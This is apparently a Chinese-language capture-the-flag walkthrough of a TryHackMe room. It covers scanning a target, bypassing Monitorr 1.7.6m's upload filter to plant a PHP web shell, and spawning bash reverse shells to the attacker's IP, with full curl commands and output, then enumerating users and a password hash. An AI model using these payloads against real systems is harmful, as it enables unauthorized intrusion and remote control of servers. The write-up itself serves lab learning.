## 概述

來源: tryhackme  
題目: Year of the Jellyfish 
難度: hard  
網址: https://tryhackme.com/room/yearofthejellyfish
靶機: `54.195.46.251`

## nmap

```bash
nmap -sV -sC -v 54.195.46.251

PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.3
22/tcp   open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|_  2048 46:b2:81:be:e0:bc:a7:86:39:39:82:5b:bf:e5:65:58 (RSA)
443/tcp  open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_ssl-date: TLS randomness does not represent time
|_http-title: Robyn&#039;s Pet Shop
|_http-server-header: Apache/2.4.29 (Ubuntu)
| ssl-cert: Subject: commonName=robyns-petshop.thm/organizationName=Robyns Petshop/stateOrProvinceName=South West/countryName=GB
| Subject Alternative Name: DNS:robyns-petshop.thm, DNS:monitorr.robyns-petshop.thm, DNS:beta.robyns-petshop.thm, DNS:dev.robyns-petshop.thm
| Issuer: commonName=robyns-petshop.thm/organizationName=Robyns Petshop/stateOrProvinceName=South West/countryName=GB
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-10-30T04:51:17
| Not valid after:  2026-10-30T04:51:17
| MD5:   1e2c:9b41:ab35:c7c1:1237:99e9:104a:a2a2
|_SHA-1: 1e7b:3000:5deb:ed20:cb8b:dc87:8cc2:00c5:3a75:34a1
| tls-alpn: 
|_  http/1.1
8000/tcp open  http-alt
|_http-favicon: Unknown favicon MD5: 58951289EDA2ED3F5E4B86DACCD03937
| http-methods: 
|_  Supported Methods: OPTIONS
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Length: 15
|_    Request
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.95%I=7%D=10/30%Time=6902EF5B%P=aarch64-unknown-linux-g
SF:nu%r(GenericLines,3F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Len
SF:gth:\x2015\r\n\r\n400\x20Bad\x20Request");
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

### DNS
發現 DNS 先加入 `/etc/hosts`
```bash
└─$ cat /etc/hosts
...
54.195.46.251   robyns-petshop.thm monitorr.robyns-petshop.thm beta.robyns-petshop.thm dev.robyns-petshop.thm
...
```

看到密碼 解一下 失敗
```bash
└─$ hashid 58951289EDA2ED3F5E4B86DACCD03937   
Analyzing '58951289EDA2ED3F5E4B86DACCD03937'
[+] MD2 
[+] MD5 
[+] MD4 
[+] Double MD5 
[+] LM 
[+] RIPEMD-128 
[+] Haval-128 
[+] Tiger-128 
[+] Skein-256(128) 
[+] Skein-512(128) 
[+] Lotus Notes/Domino 5 
[+] Skype 
[+] Snefru-128 
[+] NTLM 
[+] Domain Cached Credentials 
[+] Domain Cached Credentials 2 
[+] DNSSEC(NSEC3) 
[+] RAdmin v2.x 

┌──(kali㉿kali)-[~/tryhackme/yotjf]
└─$ echo "58951289EDA2ED3F5E4B86DACCD03937" >hash 
                                                                            
┌──(kali㉿kali)-[~/tryhackme/yotjf]
└─$ ls
hash
                                                                            
┌──(kali㉿kali)-[~/tryhackme/yotjf]
└─$ hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt 

#破解失敗
```

`http://54.195.46.251:8000/`
```bash
If you have been given a specific ID to use when accessing this development site, please put it at the end of the url (e.g. 54.195.46.251:8000/ID_HERE)
```

## feroxbuster
```bash
└─$ feroxbuster -u https://54.195.46.251/ -w ~/wordlists/directories.txt -t 50 -C 404 -k
                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://54.195.46.251/
 🚩  In-Scope Url          │ 54.195.46.251
 🚀  Threads               │ 50
 📖  Wordlist              │ /home/kali/wordlists/directories.txt
 💢  Status Code Filters   │ [404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       15l       18w      111c https://54.195.46.251/.gitignore
200      GET      134l      401w     4168c https://54.195.46.251/themes/default/js/utils.js
200      GET      386l     1148w     8882c https://54.195.46.251/themes/default/css/style.css
200      GET       61l      223w     2022c https://54.195.46.251/themes/default/css/fontello.css
200      GET       41l       83w     1920c https://54.195.46.251/themes/default/css/droidsans.css
200      GET        3l      116w     4577c https://54.195.46.251/themes/default/js/modernizr-3.3.1-custom.min.js
200      GET       74l      180w     2388c https://54.195.46.251/themes/default/js/pico.js
200      GET      145l      952w    76804c https://54.195.46.251/assets/pets/fred.jpg
200      GET      245l     1314w   109300c https://54.195.46.251/assets/pets/gerald.jpg
200      GET      388l     1687w   139053c https://54.195.46.251/assets/pets/credence.jpg
200      GET      355l     1938w   135295c https://54.195.46.251/assets/pets/alistair.jpg
200      GET      388l     2682w   263244c https://54.195.46.251/assets/pets/honey.jpg
200      GET       74l      307w     3631c https://54.195.46.251/
200      GET       14l      131w      971c https://54.195.46.251/themes/default/pico-theme.yml
200      GET       21l      172w     1085c https://54.195.46.251/themes/default/LICENSE
200      GET      135l      546w     3942c https://54.195.46.251/themes/default/CHANGELOG.md
200      GET       67l      729w     5381c https://54.195.46.251/themes/default/README.md
200      GET       85l      281w     3591c https://54.195.46.251/themes/default/index.twig
200      GET       38l       88w     1188c https://54.195.46.251/themes/default/composer.json
200      GET        1l       29w      353c https://54.195.46.251/themes/default/img/pico-white.svg
200      GET        1l       29w      353c https://54.195.46.251/themes/default/img/pico.svg
200      GET       23l       49w      519c https://54.195.46.251/themes/default/icon/COPYRIGHT.txt
200      GET        8l      102w     6472c https://54.195.46.251/themes/default/icon/fontello.woff
200      GET       49l      336w     7912c https://54.195.46.251/themes/default/icon/fontello.eot
200      GET       94l      676w     4397c https://54.195.46.251/themes/default/icon/LICENSE.OFL-1.1.txt
200      GET       14l       80w     5494c https://54.195.46.251/themes/default/icon/fontello.woff2
200      GET       21l      171w     1079c https://54.195.46.251/themes/default/icon/LICENSE.MIT.txt
200      GET       18l      362w     2890c https://54.195.46.251/themes/default/icon/fontello.svg
200      GET       49l      335w     7740c https://54.195.46.251/themes/default/icon/fontello.ttf
200      GET      189l     1489w    10694c https://54.195.46.251/themes/default/font/LICENSE.txt
200      GET       78l      393w    33356c https://54.195.46.251/themes/default/font/DroidSans-Regular.woff2
200      GET      246l     6340w    47769c https://54.195.46.251/themes/default/font/DroidSansMono-Regular.svg
200      GET       21l      172w     1085c https://54.195.46.251/LICENSE
200      GET       55l      335w    26423c https://54.195.46.251/themes/default/font/DroidSansMono-Regular.woff2
200      GET       89l      616w    37075c https://54.195.46.251/themes/default/font/DroidSans-Regular.eot
200      GET      168l     1091w    54237c https://54.195.46.251/themes/default/font/DroidSans-Regular.ttf
200      GET      101l      538w    40916c https://54.195.46.251/themes/default/font/DroidSans-Bold.woff
200      GET       85l      556w    36796c https://54.195.46.251/themes/default/font/DroidSans-Bold.eot
200      GET       72l      454w    33426c https://54.195.46.251/themes/default/font/DroidSans-Bold.woff2
200      GET       85l      410w    34224c https://54.195.46.251/themes/default/font/DroidSansMono-Regular.woff
200      GET      155l     1151w    41879c https://54.195.46.251/themes/default/font/DroidSansMono-Regular.ttf
200      GET      155l     1162w    42109c https://54.195.46.251/themes/default/font/DroidSansMono-Regular.eot
200      GET       93l      510w    40887c https://54.195.46.251/themes/default/font/DroidSans-Regular.woff
200      GET      179l     1140w    53909c https://54.195.46.251/themes/default/font/DroidSans-Bold.ttf
200      GET     2021l    18070w   143047c https://54.195.46.251/themes/default/font/DroidSans-Regular.svg
200      GET     2021l    18228w   144446c https://54.195.46.251/themes/default/font/DroidSans-Bold.svg
301      GET        9l       28w      317c https://54.195.46.251/assets => https://54.195.46.251/assets/
401      GET       14l       54w      461c https://54.195.46.251/business
301      GET        9l       28w      317c https://54.195.46.251/config => https://54.195.46.251/config/
301      GET        9l       28w      318c https://54.195.46.251/content => https://54.195.46.251/content/
200      GET       60l      480w     3969c https://54.195.46.251/config/config.yml
200      GET       26l      165w     1112c https://54.195.46.251/content/index.md
200      GET       12l       25w      216c https://54.195.46.251/content/contact/index.md
200      GET       74l      307w     3631c https://54.195.46.251/index.php
301      GET        9l       28w      318c https://54.195.46.251/plugins => https://54.195.46.251/plugins/
500      GET        0l        0w        0c https://54.195.46.251/plugins/PicoDeprecated/PicoDeprecated.php
200      GET       21l      172w     1085c https://54.195.46.251/plugins/PicoDeprecated/LICENSE
200      GET       41l       98w     1321c https://54.195.46.251/plugins/PicoDeprecated/composer.json
200      GET       44l      801w     6184c https://54.195.46.251/plugins/PicoDeprecated/README.md
200      GET      155l      797w     5715c https://54.195.46.251/plugins/PicoDeprecated/CHANGELOG.md
500      GET        0l        0w        0c https://54.195.46.251/plugins/PicoDeprecated/plugins/PicoMainCompatPlugin.php
200      GET        0l        0w        0c https://54.195.46.251/plugins/PicoDeprecated/lib/PicoCompatPluginInterface.php
500      GET        0l        0w        0c https://54.195.46.251/plugins/PicoDeprecated/plugins/PicoPluginApi1CompatPlugin.php
500      GET        0l        0w        0c https://54.195.46.251/plugins/PicoDeprecated/lib/AbstractPicoCompatPlugin.php
500      GET        0l        0w        0c https://54.195.46.251/plugins/PicoDeprecated/plugins/PicoThemeApi0CompatPlugin.php
500      GET        0l        0w        0c https://54.195.46.251/plugins/PicoDeprecated/plugins/PicoThemeApi1CompatPlugin.php
500      GET        0l        0w        0c https://54.195.46.251/plugins/PicoDeprecated/plugins/PicoPluginApi2CompatPlugin.php
500      GET        0l        0w        0c https://54.195.46.251/plugins/PicoDeprecated/plugins/PicoPluginApi0CompatPlugin.php
500      GET        0l        0w        0c https://54.195.46.251/plugins/PicoDeprecated/lib/AbstractPicoPluginApiCompatPlugin.php
500      GET        0l        0w        0c https://54.195.46.251/plugins/PicoDeprecated/plugins/PicoThemeApi2CompatPlugin.php
500      GET        0l        0w        0c https://54.195.46.251/plugins/PicoDeprecated/lib/PicoPluginApiCompatPluginInterface.php
301      GET        9l       28w      317c https://54.195.46.251/themes => https://54.195.46.251/themes/
301      GET        9l       28w      317c https://54.195.46.251/vendor => https://54.195.46.251/vendor/
200      GET        0l        0w        0c https://54.195.46.251/vendor/pico-plugin.php
200      GET        0l        0w        0c https://54.195.46.251/vendor/autoload.php
200      GET        0l        0w        0c https://54.195.46.251/vendor/composer/ClassLoader.php
200      GET        0l        0w        0c https://54.195.46.251/vendor/composer/autoload_psr4.php
200      GET        0l        0w        0c https://54.195.46.251/vendor/composer/autoload_classmap.php
200      GET        0l        0w        0c https://54.195.46.251/vendor/composer/autoload_real.php
200      GET        0l        0w        0c https://54.195.46.251/vendor/composer/autoload_files.php
200      GET        0l        0w        0c https://54.195.46.251/vendor/composer/autoload_static.php
200      GET       21l      168w     1070c https://54.195.46.251/vendor/composer/LICENSE
200      GET        0l        0w        0c https://54.195.46.251/vendor/composer/autoload_namespaces.php
200      GET      573l     1105w    18449c https://54.195.46.251/vendor/composer/installed.json
200      GET       51l      103w     1335c https://54.195.46.251/vendor/twig/twig/composer.json
200      GET       31l      219w     1497c https://54.195.46.251/vendor/twig/twig/LICENSE
200      GET        0l        0w        0c https://54.195.46.251/vendor/erusev/parsedown/Parsedown.php
200      GET       15l       57w      484c https://54.195.46.251/vendor/twig/twig/README.rst
200      GET       21l      172w     1085c https://54.195.46.251/vendor/picocms/composer-installer/LICENSE
200      GET       25l       91w      686c https://54.195.46.251/vendor/picocms/composer-installer/CHANGELOG.md
200      GET        0l        0w        0c https://54.195.46.251/vendor/symfony/polyfill-ctype/Ctype.php
500      GET        0l        0w        0c https://54.195.46.251/vendor/erusev/parsedown-extra/ParsedownExtra.php
200      GET       35l       89w     1213c https://54.195.46.251/vendor/picocms/composer-installer/composer.json
200      GET       97l      559w     4888c https://54.195.46.251/vendor/erusev/parsedown/README.md
200      GET       33l       61w      787c https://54.195.46.251/vendor/erusev/parsedown/composer.json
200      GET       20l      172w     1097c https://54.195.46.251/vendor/erusev/parsedown/LICENSE.txt
200      GET      174l     1384w    10150c https://54.195.46.251/vendor/picocms/composer-installer/README.md
200      GET       33l       41w      815c https://54.195.46.251/vendor/twig/twig/phpunit.xml.dist
200      GET       12l       40w      352c https://54.195.46.251/vendor/symfony/polyfill-ctype/README.md
200      GET       19l      167w     1065c https://54.195.46.251/vendor/symfony/polyfill-ctype/LICENSE
200      GET       38l       80w      988c https://54.195.46.251/vendor/symfony/polyfill-ctype/composer.json
200      GET       19l      167w     1065c https://54.195.46.251/vendor/symfony/yaml/LICENSE
200      GET        0l        0w        0c https://54.195.46.251/vendor/symfony/polyfill-ctype/bootstrap.php
200      GET        0l        0w        0c https://54.195.46.251/vendor/symfony/yaml/Parser.php
200      GET       34l       62w      791c https://54.195.46.251/vendor/symfony/yaml/composer.json
200      GET       28l       86w      596c https://54.195.46.251/vendor/symfony/yaml/CHANGELOG.md
200      GET        0l        0w        0c https://54.195.46.251/vendor/symfony/yaml/Inline.php
200      GET        0l        0w        0c https://54.195.46.251/vendor/symfony/yaml/Dumper.php
200      GET        0l        0w        0c https://54.195.46.251/vendor/symfony/yaml/Unescaper.php
200      GET       30l       38w      831c https://54.195.46.251/vendor/symfony/yaml/phpunit.xml.dist
200      GET        0l        0w        0c https://54.195.46.251/vendor/symfony/yaml/Escaper.php
200      GET       20l      172w     1091c https://54.195.46.251/vendor/erusev/parsedown-extra/LICENSE.txt
200      GET        0l        0w        0c https://54.195.46.251/vendor/symfony/yaml/Yaml.php
200      GET       13l       29w      463c https://54.195.46.251/vendor/symfony/yaml/README.md
200      GET       31l       96w     1232c https://54.195.46.251/vendor/erusev/parsedown-extra/README.md
200      GET       36l       77w     1084c https://54.195.46.251/vendor/erusev/parsedown-extra/composer.json
200      GET     1018l     7022w    45459c https://54.195.46.251/vendor/twig/twig/CHANGELOG
301      GET        9l       28w      330c https://54.195.46.251/vendor/picocms/pico => https://54.195.46.251/vendor/picocms/pico/
301      GET        9l       28w      337c https://54.195.46.251/vendor/picocms/pico/assets => https://54.195.46.251/vendor/picocms/pico/assets/
301      GET        9l       28w      337c https://54.195.46.251/vendor/picocms/pico/config => https://54.195.46.251/vendor/picocms/pico/config/
301      GET        9l       28w      338c https://54.195.46.251/vendor/picocms/pico/content => https://54.195.46.251/vendor/picocms/pico/content/
500      GET        0l        0w        0c https://54.195.46.251/vendor/picocms/pico/index.php
301      GET        9l       28w      334c https://54.195.46.251/vendor/picocms/pico/lib => https://54.195.46.251/vendor/picocms/pico/lib/
301      GET        9l       28w      338c https://54.195.46.251/vendor/picocms/pico/plugins => https://54.195.46.251/vendor/picocms/pico/plugins/
301      GET        9l       28w      337c https://54.195.46.251/vendor/picocms/pico/themes => https://54.195.46.251/vendor/picocms/pico/themes/

```

有個登入頁面
```bash
https://54.195.46.251/business
```

### hydra 失敗
想來暴力破解看看 失敗
```bash
# 加上更多選項
hydra -l admin -P passwords.txt -t 4 -w 30 -f 54.195.46.251 http-get /business

# 參數說明:
# -t 4: 使用 4 個並行連接
# -w 30: 超時時間 30 秒
# -f: 找到第一組有效憑證後停止
# -V: 顯示詳細輸出
# -o output.txt: 將結果保存到文件
```
但一直錯誤 就改其他方法了

## monitorr
訪問 `monitorr.robyns-petshop.thm`
```bash
┌──(kali㉿kali)-[~/tryhackme/yotjf]
└─$ curl -k "https://monitorr.robyns-petshop.thm/"
<!DOCTYPE html>
<html lang="en">

    <!--
    __  __             _ _
    |  \/  |           (_) |
    | \  / | ___  _ __  _| |_ ___  _ __ _ __
    | |\/| |/ _ \| '_ \| | __/ _ \| '__| '__|
    | |  | | (_) | | | | | || (_) | |  | |
    |_|  |_|\___/|_| |_|_|\__\___/|_|  |_|
            made for the community
    by @seanvree, @wjbeckett, and @jonfinley
    https://github.com/Monitorr/Monitorr
    -->

    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <link rel="manifest" href="webmanifest.json">
...

             <div id="settingslink">
                <a class="footer a" href="settings.php" target="s" title="Monitorr Settings"><i class="fa fa-fw fa-cog"></i>Monitorr Settings </a>
            </div>

            <p> <a class="footer a" href="https://github.com/monitorr/Monitorr" target="_blank" title="Monitorr Repo"> Monitorr </a> | <a class="footer a" href="https://github.com/Monitorr/Monitorr/releases" target="_blank" title="Monitorr Releases"> 1.7.6m
 </a> </p>

            <div id="version_check_auto"></div>

        </div>

    </body>

</html>
```
發現 `Monitorr Releases 1.7.6m`
查一下有沒有 exlploit
```bash
┌──(kali㉿kali)-[~/tryhackme/yotjf]
└─$ searchsploit monitorr 1.7.6         
------------------------------------------ ---------------------------------
 Exploit Title                            |  Path
------------------------------------------ ---------------------------------
Monitorr 1.7.6m - Authorization Bypass    | php/webapps/48981.py
Monitorr 1.7.6m - Remote Code Execution ( | php/webapps/48980.py
------------------------------------------ ---------------------------------
Shellcodes: No Results

```

發現有 RCE  
看一下 [php/webapps/48980.py](48980.py)  
了解一下後嘗試自己上傳個檔案看看
```bash
┌──(kali㉿kali)-[~/tryhackme/yotjf]
└─$ cat test.php      
<?php shell_exec(\"/bin/bash -c 'bash -i >& /dev/tcp/10.4.11.38/1234 0>&1'\"); ?>

┌──(kali㉿kali)-[~/tryhackme/yotjf]
└─$ curl -k -X POST https://monitorr.robyns-petshop.thm/assets/php/upload.php \
  -F "fileToUpload=@test.php" \
  -v
Note: Unnecessary use of -X or --request, POST is already inferred.
* Host monitorr.robyns-petshop.thm:443 was resolved.
* IPv6: (none)
* IPv4: 54.195.46.251
*   Trying 54.195.46.251:443...
* ALPN: curl offers h2,http/1.1
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.3 (IN), TLS change cipher, Change cipher spec (1):
* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):
* TLSv1.3 (IN), TLS handshake, Certificate (11):
* TLSv1.3 (IN), TLS handshake, CERT verify (15):
* TLSv1.3 (IN), TLS handshake, Finished (20):
* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):
* TLSv1.3 (OUT), TLS handshake, Finished (20):
* SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384 / x25519 / RSASSA-PSS
* ALPN: server accepted http/1.1
* Server certificate:
*  subject: C=GB; ST=South West; L=Bristol; O=Robyns Petshop; CN=robyns-petshop.thm; emailAddress=robyn@robyns-petshop.thm
*  start date: Oct 30 04:51:17 2025 GMT
*  expire date: Oct 30 04:51:17 2026 GMT
*  issuer: C=GB; ST=South West; L=Bristol; O=Robyns Petshop; CN=robyns-petshop.thm; emailAddress=robyn@robyns-petshop.thm
*  SSL certificate verify result: self-signed certificate (18), continuing anyway.
*   Certificate level 0: Public key type RSA (2048/112 Bits/secBits), signed using sha256WithRSAEncryption
* Connected to monitorr.robyns-petshop.thm (54.195.46.251) port 443
* using HTTP/1.x
> POST /assets/php/upload.php HTTP/1.1
> Host: monitorr.robyns-petshop.thm
> User-Agent: curl/8.14.1
> Accept: */*
> Content-Length: 221
> Content-Type: multipart/form-data; boundary=------------------------uwNxGZ3VMqceMBfYfVq6sU
> 
* upload completely sent off: 221 bytes
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
< HTTP/1.1 200 OK
< Date: Thu, 30 Oct 2025 06:08:13 GMT
< Server: Apache/2.4.29 (Ubuntu)
< Vary: Accept-Encoding
< Content-Length: 115
< Content-Type: text/html; charset=UTF-8
< 
* Connection #0 to host monitorr.robyns-petshop.thm left intact
<div id='uploadreturn'>You are an exploit.</div><div id='uploaderror'>ERROR: test.php was not uploaded.</div></div>    
```

結果一直失敗
發現是 `cookie` 的問題
```bash
└─$ curl -I -k 'https://monitorr.robyns-petshop.thm/'
HTTP/1.1 200 OK
Date: Thu, 30 Oct 2025 07:59:59 GMT
Server: Apache/2.4.29 (Ubuntu)
Set-Cookie: isHuman=1; path=/
Content-Type: text/html; charset=UTF-8
```
把 `isHuman=1` cookie 加上後就...
換成另一個錯誤了
```bash
┌──(kali㉿kali)-[~/tryhackme/yotjf]
└─$ cat pig.gif.php 
<?php shell_exec(\"/bin/bash -c 'bash -i >& /dev/tcp/10.4.11.38/1234 0>&1'\"); ?>
                                                                                                                                                            
┌──(kali㉿kali)-[~/tryhackme/yotjf]
└─$ curl -k -X POST https://monitorr.robyns-petshop.thm/assets/php/upload.php \
  -F "fileToUpload=@pig.gif.php" -H "Cookie: isHuman=1" -v

Note: Unnecessary use of -X or --request, POST is already inferred.
* Host monitorr.robyns-petshop.thm:443 was resolved.
* IPv6: (none)
* IPv4: 54.195.46.251
*   Trying 54.195.46.251:443...
* ALPN: curl offers h2,http/1.1
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.3 (IN), TLS change cipher, Change cipher spec (1):
* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):
* TLSv1.3 (IN), TLS handshake, Certificate (11):
* TLSv1.3 (IN), TLS handshake, CERT verify (15):
* TLSv1.3 (IN), TLS handshake, Finished (20):
* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):
* TLSv1.3 (OUT), TLS handshake, Finished (20):
* SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384 / x25519 / RSASSA-PSS
* ALPN: server accepted http/1.1
* Server certificate:
*  subject: C=GB; ST=South West; L=Bristol; O=Robyns Petshop; CN=robyns-petshop.thm; emailAddress=robyn@robyns-petshop.thm
*  start date: Oct 30 04:51:17 2025 GMT
*  expire date: Oct 30 04:51:17 2026 GMT
*  issuer: C=GB; ST=South West; L=Bristol; O=Robyns Petshop; CN=robyns-petshop.thm; emailAddress=robyn@robyns-petshop.thm
*  SSL certificate verify result: self-signed certificate (18), continuing anyway.
*   Certificate level 0: Public key type RSA (2048/112 Bits/secBits), signed using sha256WithRSAEncryption
* Connected to monitorr.robyns-petshop.thm (54.195.46.251) port 443
* using HTTP/1.x
> POST /assets/php/upload.php HTTP/1.1
> Host: monitorr.robyns-petshop.thm
> User-Agent: curl/8.14.1
> Accept: */*
> Cookie: isHuman=1
> Content-Length: 305
> Content-Type: multipart/form-data; boundary=------------------------OuVj47T1CqsavPCED1F5cR
> 
* upload completely sent off: 305 bytes
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
< HTTP/1.1 200 OK
< Date: Thu, 30 Oct 2025 06:27:44 GMT
< Server: Apache/2.4.29 (Ubuntu)
< Vary: Accept-Encoding
< Content-Length: 203
< Content-Type: text/html; charset=UTF-8
< 
* Connection #0 to host monitorr.robyns-petshop.thm left intact
<div id='uploadreturn'><div id='uploaderror'>ERROR: pig.gif.php is not an image or exceeds the webserver’s upload size limit.</div><div id='uploaderror'>ERROR: pig.gif.php was not uploaded.</div></div>   
```
出現此錯誤  
`RROR: pig.gif.php is not an image or exceeds the webserver’s upload size limit.`  
後來發現是檔案名稱的問題 .php 不給上傳 必須要圖檔  
試了一堆檔名才又發現檔案開頭需加上 `GIF89a` 才可識別 `.gif` 檔案
> 其實原本的 POC 就有寫了只是我沒注意到 QQ

### POC
```bash
└─$ cat she_ll.gif.pHp                                                         
GIF89a
<?php system($_GET['cmd']); ?>
```
```bash
└─$ curl -k -X POST https://monitorr.robyns-petshop.thm/assets/php/upload.php \
  -F "fileToUpload=@she_ll.gif.pHp" -H "Cookie: isHuman=1" -v 

Note: Unnecessary use of -X or --request, POST is already inferred.
* Host monitorr.robyns-petshop.thm:443 was resolved.
* IPv6: (none)
* IPv4: 54.195.46.251
*   Trying 54.195.46.251:443...
* ALPN: curl offers h2,http/1.1
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.3 (IN), TLS change cipher, Change cipher spec (1):
* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):
* TLSv1.3 (IN), TLS handshake, Certificate (11):
* TLSv1.3 (IN), TLS handshake, CERT verify (15):
* TLSv1.3 (IN), TLS handshake, Finished (20):
* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):
* TLSv1.3 (OUT), TLS handshake, Finished (20):
* SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384 / x25519 / RSASSA-PSS
* ALPN: server accepted http/1.1
* Server certificate:
*  subject: C=GB; ST=South West; L=Bristol; O=Robyns Petshop; CN=robyns-petshop.thm; emailAddress=robyn@robyns-petshop.thm
*  start date: Oct 30 04:51:17 2025 GMT
*  expire date: Oct 30 04:51:17 2026 GMT
*  issuer: C=GB; ST=South West; L=Bristol; O=Robyns Petshop; CN=robyns-petshop.thm; emailAddress=robyn@robyns-petshop.thm
*  SSL certificate verify result: self-signed certificate (18), continuing anyway.
*   Certificate level 0: Public key type RSA (2048/112 Bits/secBits), signed using sha256WithRSAEncryption
* Connected to monitorr.robyns-petshop.thm (54.195.46.251) port 443
* using HTTP/1.x
> POST /assets/php/upload.php HTTP/1.1
> Host: monitorr.robyns-petshop.thm
> User-Agent: curl/8.14.1
> Accept: */*
> Cookie: isHuman=1
> Content-Length: 264
> Content-Type: multipart/form-data; boundary=------------------------lGtFnRaWXK4rhMuAIOyNjy
> 
* upload completely sent off: 264 bytes
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
< HTTP/1.1 200 OK
< Date: Thu, 30 Oct 2025 06:35:54 GMT
< Server: Apache/2.4.29 (Ubuntu)
< Vary: Accept-Encoding
< Content-Length: 162
< Content-Type: text/html; charset=UTF-8
< 
* Connection #0 to host monitorr.robyns-petshop.thm left intact
<div id='uploadreturn'>File she_ll.gif.pHp is an image: <br><div id='uploadok'>File she_ll.gif.pHp has been uploaded to: ../data/usrimg/she_ll.gif.php</div></div>                                       
```

終於上傳成功取得 cmd
```bash
┌──(kali㉿kali)-[~/tryhackme/yotjf]
└─$ curl -k "https://monitorr.robyns-petshop.thm/assets/data/usrimg/test.gif.php?cmd=id"
GIF89auid=33(www-data) gid=33(www-data) groups=33(www-data)

```

嘗試反射 shell 到 nc
過程一直失敗 
換了 reverse shell.php的內容  
直接透過 cmd 下 reverse shell 都不行  
後來才發現是我用錯 port  
這台靶機好像是模擬現實環境
所以 nmap 掃描有開通的 port 才可通  
原本用 1234 port 卡了超久 QQ
改了 443 port 終於反射成功了

```bash
# 終端機1
└─$  curl -k "https://monitorr.robyns-petshop.thm/assets/data/usrimg/test.gif.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.4.11.38/443+0>%261'"

# 終端機2
┌──(kali㉿kali)-[~/tryhackme/yotjf]
└─$ nc -nvlp 443 
listening on [any] 443 ...
connect to [10.4.11.38] from (UNKNOWN) [10.10.243.193] 53628
bash: cannot set terminal process group (896): Inappropriate ioctl for device
bash: no job control in this shell
www-data@petshop:/var/www/monitorr/assets/data/usrimg$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@petshop:/var/www/monitorr/assets/data/usrimg$ ^C
                                                                                                                                            # 再試了一個 80 的確 nmap 有掃到的就可以         
┌──(kali㉿kali)-[~/tryhackme/yotjf]
└─$ nc -nvlp 80 
listening on [any] 80 ...
connect to [10.4.11.38] from (UNKNOWN) [10.10.243.193] 51212
bash: cannot set terminal process group (896): Inappropriate ioctl for device
bash: no job control in this shell
www-data@petshop:/var/www/monitorr/assets/data/usrimg$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@petshop:/var/www/monitorr/assets/data/usrimg$ ^C

```

### exploit.py
也參考 [48980.py](48980.py) 修改了一個 [exploit.py](exploit.py)
因為原本的一直報錯 QQ 
1. 過濾掉 ssl 認證
2. php 內的語法有錯

exploit.py 也能成功反射 nc
```bash
└─$ python3 exploit.py https://monitorr.robyns-petshop.thm/ 10.4.11.38 443
Upload response: 200
A shell script should be uploaded. Now we try to execute it
```

## get flag 1
```bash
www-data@petshop:/$ find /var /opt /etc -type f -name 'flag*.txt' 2>/dev/null
/var/www/flag1.txt
www-data@petshop:/$ cat /var/www/flag1.txt
cat /var/www/flag1.txt
THM{Mj...Nl}

```

## 提權

發現 `robyn` 使用者
```bash
www-data@petshop:/var/www/monitorr/assets/data/usrimg$ cat /etc/passwd |grep /home
<orr/assets/data/usrimg$ cat /etc/passwd |grep /home   
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
robyn:x:1000:1000:Robyn Mackenzie,,,:/home/robyn:/bin/bash
```

找到一組 `robyn` 密碼 破解失敗
```bash
www-data@petshop:/var/www/monitorr/assets/data/usrimg$ grep -R -I 'robyn' /var /opt /etc 2>/dev/null          
...
/etc/apache2/htpasswd:robyn:$apr1$tMFlj08b$5VCOhI2see0L0WRU8Mn.b.
```

找到一組 `admin` 密碼 破解失敗
```bash
www-data@petshop:/var/www/monitorr$ cat datausers.db
cat datausers.db
